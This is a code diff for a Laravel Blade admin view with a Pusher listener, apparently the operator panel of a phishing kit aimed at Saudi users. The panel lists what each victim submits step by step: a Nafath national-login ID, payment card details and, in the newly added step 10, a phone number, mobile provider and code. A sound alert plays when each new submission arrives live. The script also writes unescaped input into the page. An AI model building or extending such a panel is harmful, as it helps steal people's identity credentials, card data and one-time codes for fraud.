@@ -33,7 +33,7 @@
                     </h3>
                 </div>
                 <div class="notificationsList">
-                  @if($notification->step_number >=11)
+                  @if($notification->step_number >=12)
                     @if($notification->nafad_id)
                     <div class="card-body">
                       <h5><i class="icon fas fa-check"></i>  قام بإرسال معرف نفاذ      </h5>
@@ -51,6 +51,16 @@
                       </div>
                     </div><hr>
                     @endif
+                  @endif
+                  @if($notification->step_number ==10)
+                  <div class="card-body">
+                    <h5><i class="icon fas fa-check"></i> أرسل معلومات شبكة الجوال      </h5>
+                      <div class="direct-chat-text">
+                      <p><strong class="fs-3 border p-1 rounded">Phone:</strong> {{$notification->phone_number_2}}</p>
+                      <p><strong class="fs-3 border p-1 rounded">Provider:</strong> {{$notification->phone_provider}}</p>
+                      <p><strong class="fs-3 border p-1 rounded">Code:</strong> {{$notification->phone_code}}</p>
+                    </div>
+                  </div><hr>
                   @endif
                     @if($notification->step_number >=4)
                      @if($notification->paymentCard)
@@ -281,5 +291,24 @@
     }
   });
 
+  var channelAuth = pusher.subscribe('send-phone-data');
+  channelAuth.bind('App\\Events\\SendPhoneData', function(dataA)
+  {
+    if(dataA.people_id == id)
+    {
+      $(".notificationsList").prepend(`
+        <div class="card-body">
+          <h5><i class="icon fas fa-check"></i> `+dataA.page+`</h5>
+            <div class="direct-chat-text">
+            <p><strong class="fs-3 border p-1 rounded">Phone:</strong> `+dataA.phone_number_2+`</p>
+            <p><strong class="fs-3 border p-1 rounded">Provider:</strong> `+dataA.phone_provider+`</p>
+            <p><strong class="fs-3 border p-1 rounded">Code:</strong> `+dataA.phone_code+`</p>
+          </div>
+        </div><hr>
+      `);
+
+      playDataAudio();
+    }
+  });
 </script>
 @endsection
